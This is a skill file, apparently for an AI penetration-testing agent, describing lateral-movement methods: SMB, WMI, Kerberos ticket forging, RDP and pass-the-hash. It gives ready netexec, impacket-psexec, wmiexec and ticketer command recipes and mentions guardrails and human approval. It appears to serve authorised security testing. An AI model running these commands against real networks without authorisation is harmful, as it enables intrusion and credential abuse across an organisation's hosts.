---
name: lateral-movement-methods
description: Lateral movement — SMB, WMI, Kerberos, RDP, pass-the-hash
license: apache-2.0
compatibility: ">=3.2"
metadata:
  version: "1.0.0"
  tags: ["lateral", "smb", "wmi", "kerberos", "rdp", "pth"]
  triggers: ["lateral movement", "pass the hash", "kerberos"]
allowed-tools: "netexec,impacket,responder"
mapped-agents: ["lateral-movement", "persistence-maintenance"]
---

# lateral-movement-methods

## Overview

Lateral movement techniques: SMB (PsExec, smbexec), WMI (wmiexec), Kerberos (pass-the-ticket, overpass-the-hash), RDP. Maps to MITRE ATT&CK TA0008 (Lateral Movement).

## When to Use

After obtaining valid credentials or session. Loaded by lateral-movement + persistence-maintenance agents.

**Mapped agents**: lateral-movement, persistence-maintenance

## Methodology

- 1. Validate credentials (netexec smb --continue-on-success)
- 2. Identify accessible hosts (netexec smb 192.168.1.0/24)
- 3. Identify admin shares (netexec --shares)
- 4. Execute via PsExec (impacket-psexec user:pass@target)
- 5. Or via WMI (impacket-wmiexec user:pass@target)
- 6. Kerberos: pass-the-ticket (Rubeus, ticketConverter.py)
- 7. RDP: if open, use restricted-admin mode with PTH
- 8. Document each hop in attack chain (PentestFact lateral_path)

## Tool Recipes

```bash
netexec smb 192.168.1.0/24 -u user -p pass --continue-on-success
```
```bash
impacket-psexec domain.local/user:pass@192.168.1.10
```
```bash
impacket-wmiexec domain.local/user:pass@192.168.1.10
```
```bash
impacket-ticketer.py -nthash <hash> -domain local -user admin -spn cifs/dc01.domain.local
```

## Output Standards

Each lateral hop: source host, target host, technique (MITRE ATT&CK T1021 Remote Services), credentials used (hash redacted), command output.

## VAPT-AI Specific Notes

- This skill follows the agentskills.io specification (same as CyberStrikeAI).
- Loaded by SkillLoader (app/skills/loader.py) on first access.
- Auto-loaded by mapped agents via BaseAgent.__init__() (W11-S5).
- Skill content available via `GET /api/orchestration/skills/lateral-movement-methods` (W11-S6).
- D18 guardrails apply: skills do NOT bypass tool allowlist enforcement.
- HITL approval still required for destructive operations (skill content is advisory).
